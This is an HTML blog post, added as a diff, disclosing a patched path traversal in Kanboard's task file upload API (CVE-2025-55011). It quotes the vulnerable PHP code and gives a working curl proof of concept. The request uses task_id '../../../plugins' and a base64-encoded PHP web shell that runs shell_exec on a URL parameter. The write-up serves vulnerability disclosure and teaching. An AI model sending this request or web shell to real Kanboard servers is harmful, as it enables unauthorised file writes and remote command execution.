@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Kanboard CVE-2025-55011 | Bryan’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="Kanboard CVE-2025-55011" />
+<meta name="author" content="Bryan Lynch" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://localhost:4000/posts/kanboard_tasks.html" />
+<meta property="og:url" content="http://localhost:4000/posts/kanboard_tasks.html" />
+<meta property="og:site_name" content="Bryan’s Blog" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Kanboard CVE-2025-55011" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","author":{"@type":"Person","name":"Bryan Lynch"},"headline":"Kanboard CVE-2025-55011","url":"http://localhost:4000/posts/kanboard_tasks.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Bryan&apos;s Blog" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Bryan&#39;s Blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger">
+            <a class="page-link" href="/">Home</a>
+						<div class="dropdown" style="display: inline-block; position: relative;">
+
+	<div class="dropdown" style="position: relative; display: inline-block;">
+  <span style="cursor: pointer; padding: 0.5em;" class="dropdown-label">
+    CVE Reports ▾
+  </span>
+  <div class="dropdown-content" style="
+    display: none;
+    position: absolute;
+    background-color: white;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+    z-index: 999;
+    min-width: 200px;
+    text-align: left;
+  ">
+    <a href="/posts/elabftw_sqli.html" style="
+          display: block;
+          padding: 0.5em 1em;
+          color: black;
+          text-decoration: none;
+          white-space: nowrap;
+        ">Elabftw CVE-2025-25206</a>
+      
+    
+    <a href="/posts/kanboard_password.html" style="
+          display: block;
+          padding: 0.5em 1em;
+          color: black;
+          text-decoration: none;
+          white-space: nowrap;
+        ">Kanboard CVE-2025-52560</a>
+      
+    <a href="/posts/kanboard_rce.html" style="
+          display: block;
+          padding: 0.5em 1em;
+          color: black;
+          text-decoration: none;
+          white-space: nowrap;
+        ">Kanboard CVE-2025-55010</a>
+      
+    <a href="/posts/kanboard_tasks.html" style="
+          display: block;
+          padding: 0.5em 1em;
+          color: black;
+          text-decoration: none;
+          white-space: nowrap;
+        ">Kanboard CVE-2025-55011</a>
+      
+    <a href="/posts/kanboard_users.html" style="
+          display: block;
+          padding: 0.5em 1em;
+          color: black;
+          text-decoration: none;
+          white-space: nowrap;
+        ">Kanboard CVE-2025-52575</a>
+      
+    
+    
+    
+    
+  </div>
+</div>
+
+<style>
+  .dropdown:hover .dropdown-content {
+    display: block !important;
+  }
+</style>
+
+            <a class="page-link" href="/posts/oswe.html">OSWE</a>
+           <a class="page-link" href="/posts/about.html">About Me</a>
+        </div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Kanboard CVE-2025-55011</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="" itemprop="datePublished">
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <style>
+pre {
+  margin-top: 1.5em;   /* space above */
+  margin-bottom: 1.5em !important; /* space below */
+}
+</style>
+
+<h2 id="path-traversal-in-task-file-upload-api-leads-to-arbitrary-file-write">Path Traversal in Task File Upload API Leads To Arbitrary File Write</h2>
+<h3 id="identifying-the-vulnerability">Identifying the Vulnerability</h3>
+<p>File upload vulnerabilities are often a great way to exploit an app. A couple clicks of a button and… BOOM! The server is now yours.  That’s why I always make it a priority to check how files are sanitized when uploaded to an app.</p>
+
+<p>When examining Kanboard’s file-related protections, I noticed that a lot of work had been done on <code class="language-plaintext highlighter-rouge">read</code> protecting key files from path traversal, particularly by this method in <code class="language-plaintext highlighter-rouge">FileStorage.php</code>.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cd">/**
+ * Fetch object contents
+ *
+ * @access public
+ * @throws ObjectStorageException
+ * @param  string  $key
+ * @return string
+ */</span>
+<span class="k">public</span> <span class="k">function</span> <span class="n">get</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">return</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getRealFilePath</span><span class="p">(</span><span class="nv">$key</span><span class="p">));</span>
+<span class="p">}</span>
+
+
+<span class="k">private</span> <span class="k">function</span> <span class="n">getRealFilePath</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$realFilePath</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">baseDir</span><span class="mf">.</span><span class="no">DIRECTORY_SEPARATOR</span><span class="mf">.</span><span class="nv">$key</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$realFilePath</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nc">ObjectStorageException</span><span class="p">(</span><span class="s1">'Invalid path: '</span><span class="mf">.</span><span class="nv">$key</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$realFilePath</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">baseDir</span><span class="p">)</span> <span class="o">!==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nc">ObjectStorageException</span><span class="p">(</span><span class="s1">'File is not in base directory: '</span><span class="mf">.</span><span class="nv">$realFilePath</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nb">file_exists</span><span class="p">(</span><span class="nv">$realFilePath</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nc">ObjectStorageException</span><span class="p">(</span><span class="s1">'File not found: '</span><span class="mf">.</span><span class="nv">$realFilePath</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="nv">$realFilePath</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>However, I soon notice that on the <code class="language-plaintext highlighter-rouge">write</code> side of things (aka file upload), similar restrictions were not in place.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cd">/**
+ * Save object
+ *
+ * @access public
+ * @throws ObjectStorageException
+ * @param  string  $key
+ * @param  string  $blob
+ */</span>
+<span class="k">public</span> <span class="k">function</span> <span class="n">put</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="o">&amp;</span><span class="nv">$blob</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">createFolder</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">baseDir</span><span class="mf">.</span><span class="no">DIRECTORY_SEPARATOR</span><span class="mf">.</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$blob</span><span class="p">)</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nc">ObjectStorageException</span><span class="p">(</span><span class="s1">'Unable to write the file: '</span><span class="mf">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">baseDir</span><span class="mf">.</span><span class="no">DIRECTORY_SEPARATOR</span><span class="mf">.</span><span class="nv">$key</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>With this in mind, I decided to see if there were any places within the app where path traversal would be possible when writing a file. I then came across the following in <code class="language-plaintext highlighter-rouge">TaskFileProcedure.php</code>.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">public</span> <span class="k">function</span> <span class="n">createTaskFile</span><span class="p">(</span><span class="nv">$project_id</span><span class="p">,</span> <span class="nv">$task_id</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">,</span> <span class="nv">$blob</span><span class="p">)</span> 
+ <span class="p">{</span> 
+     <span class="nc">ProjectAuthorization</span><span class="o">::</span><span class="nf">getInstance</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">container</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">check</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getClassName</span><span class="p">(),</span> <span class="s1">'createTaskFile'</span><span class="p">,</span> <span class="nv">$project_id</span><span class="p">);</span> 
+  
+     <span class="k">try</span> <span class="p">{</span> 
+         <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">taskFileModel</span><span class="o">-&gt;</span><span class="nf">uploadContent</span><span class="p">(</span><span class="nv">$task_id</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">,</span> <span class="nv">$blob</span><span class="p">);</span> 
+     <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nc">ObjectStorageException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span> 
+         <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">logger</span><span class="o">-&gt;</span><span class="nf">error</span><span class="p">(</span><span class="k">__METHOD__</span><span class="mf">.</span><span class="s1">': '</span><span class="mf">.</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="nf">getMessage</span><span class="p">());</span> 
+         <span class="k">return</span> <span class="kc">false</span><span class="p">;</span> 
+     <span class="p">}</span> 
+ <span class="p">}</span> 
+</code></pre></div></div>
+<p>As can be seen, the method takes in a <code class="language-plaintext highlighter-rouge">project_id</code>, <code class="language-plaintext highlighter-rouge">task_id</code>, <code class="language-plaintext highlighter-rouge">filename</code>, and a <code class="language-plaintext highlighter-rouge">blob</code>. Note that the <code class="language-plaintext highlighter-rouge">project_id</code> appears to be validated in the first line, but the other params are not.</p>
+
+<p>Going further down the method chain into <code class="language-plaintext highlighter-rouge">FileModel.php</code>, we can see how the file path is generated for a file about to be written.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/**
+ * Generate the path for a new filename
+ *
+ * @access public
+ * @param  integer   $id            Foreign key
+ * @param  string    $filename      Filename
+ * @return string
+ */
+public function generatePath($id, $filename)
+{
+    return $this-&gt;getPathPrefix().DIRECTORY_SEPARATOR.$id.DIRECTORY_SEPARATOR.hash('sha1', $filename.time());
+}
+</code></pre></div></div>
+
+<p>Note that we cannot influence the final file name, as the file name we supply will be <code class="language-plaintext highlighter-rouge">SHA-1</code> hashed with the current timestamp.  However, we do control the <code class="language-plaintext highlighter-rouge">id</code> field via <code class="language-plaintext highlighter-rouge">task_id</code>, and from what we saw before, this means that we have full control over the directory we want to place the file in! All we have to do is use a payload like:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"project_id": 1,
+"task_id": "../../../plugins",
+"filename": "shell.php",
+"blob": "PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWydjbWQnXSk7ID8+"
+</code></pre></div></div>
+
+<p>Since the app by default blocks execution of all files in the <code class="language-plaintext highlighter-rouge">/data</code> directory, we can use this path traversal to our advantage and escape the data directory to hopefully trigger execution.</p>
+
+<h3 id="exploiting">Exploiting</h3>
+
+<p>Assuming the base installation of Kanboard via docker, the following folders will be writable. Fortunately with the default container settings these are relatively low-risk.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/run/nginx
+/var/lib/nginx
+/var/lib/nginx/tmp
+/var/lib/nginx/tmp/fastcgi
+/var/lib/nginx/tmp/client_body
+/var/lib/nginx/tmp/uwsgi
+/var/lib/nginx/tmp/scgi
+/var/lib/nginx/tmp/proxy
+/var/log/nginx
+/var/www/app/plugins
+/var/www/app/data
+/var/www/app/data/cache
+/var/www/app/data/files
+/var/www/app/data/files/tasks
+/var/www/app/data/files/tasks/1
+/proc/acpi
+/proc/asound
+/tmp
+/dev/mqueue
+/dev/shm
+/var/tmp
+/sys/firmware
+</code></pre></div></div>
+
+<p>However on a manual installation outside of the docker setup, this exploit could be much riskier. If a user denies all execution in the data directory but allows it from anywhere else, an attacker could write a reverse shell to plugins and immediately gain remote code execution and greatly increase the severity.</p>
+
+<h3 id="poc">PoC</h3>
+<p>Running Kanboard 1.2.46 inside docker on locahost:3000.</p>
+
+<ol>
+  <li>
+    <p>After creating a project, make the following curl requst:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> curl -X POST http://localhost:3000/jsonrpc.php \
+ -u admin:admin \
+ -H "Content-Type: application/json" \
+ -d '{
+ "jsonrpc": "2.0",
+ "method": "createTaskFile",
+ "id": 1,
+ "params": {
+   "project_id": 1,
+   "task_id": "../../../plugins",
+   "filename": "shell.php",
+   "blob": "PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWydjbWQnXSk7ID8+"
+ }
+ }'
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>In the docker container notice that a file has been created in the /plugins directory with a php reverse shell as it’s contents (fortunately it’s not executable in the docker setup, but could be on user installations).</p>
+
+    <figure style="text-align: center; margin: 2em 0;">
+   <img src="/assets/img/kanboard/file_created.png" alt="Password Reset" style="display: block; margin-left: auto; margin-right: auto; max-width: 90%; border-radius: 8px;" />
+ </figure>
+  </li>
+</ol>
+
+<h3 id="final-thoughts">Final Thoughts</h3>
+<p>Developers are always paranoid about arbitrary file read, but often times file write can be just as deadly. What’s more, even if obvious parameters like <code class="language-plaintext highlighter-rouge">filename</code> are sanitized, if other parameters are used in the path (like <code class="language-plaintext highlighter-rouge">task_id</code>) path traversal can still be possible.</p>
+
+<p>Note that this has been patched and a security advisory has been published here: <a href="https://github.com/kanboard/kanboard/security/advisories/GHSA-26f4-rx96-xc55">GHSA-26f4-rx96-xc55 advisory</a></p>
+
+
+  </div><a class="u-url" href="/posts/kanboard_tasks.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Bryan&#39;s Blog</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Bryan Lynch</li><li><a class="u-email" href="mailto:bml312@nyu.edu">bml312@nyu.edu</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p></p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
